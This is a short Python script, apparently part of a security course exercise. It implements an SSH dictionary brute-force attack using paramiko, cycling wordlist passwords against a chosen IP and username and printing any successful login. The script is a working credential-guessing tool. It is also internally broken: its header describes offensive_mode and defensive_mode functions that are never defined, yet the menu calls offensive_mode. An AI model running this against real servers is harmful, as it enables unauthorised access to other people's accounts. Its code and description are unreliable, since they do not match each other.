#!/usr/bin/env python3
# Script Name: Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Description: This script defines two functions (offensive_mode and defensive_mode) for the respective modes and a main function to handle user input and mode selection
# Author: Israel Quirola
# Date: January 31, 2024

import paramiko
import time

def ssh_brute_force(ip_address, username, word_list_path):
    with open(word_list_path, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                # Create an SSH client
                client = paramiko.SSHClient()

                # Automatically add the server's host key (this is insecure; see comments below)
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                # Connect to the SSH server
                client.connect(ip_address, username=username, password=password)

                # If the connection is successful, print the credentials and break the loop
                print(f"Successful login - Username: {username}, Password: {password}")
                break

            except paramiko.AuthenticationException:
                # If authentication fails, continue to the next password
                print(f"Failed login attempt - Username: {username}, Password: {password}")
                time.sleep(1)  # Add a delay of 1 second between attempts

            except Exception as e:
                # Handle other exceptions (e.g., network errors)
                print(f"Error: {e}")

            finally:
                # Close the SSH client
                client.close()

def main():
    print("Select mode:")
    print("1. Offensive; Dictionary Iterator")
    print("2. SSH Brute Force")

    mode = input("Enter the mode number (1 or 2): ")

    if mode == "1":
        word_list_path = input("Enter the path to the word list file: ")
        offensive_mode(word_list_path)

    elif mode == "2":
        ip_address = input("Enter the IP address of the SSH server: ")
        username = input("Enter the SSH username: ")
        word_list_path = input("Enter the path to the word list file: ")
        ssh_brute_force(ip_address, username, word_list_path)

    else:
        print("Invalid mode selection. Please enter either '1' or '2'.")

if __name__ == "__main__":
    main()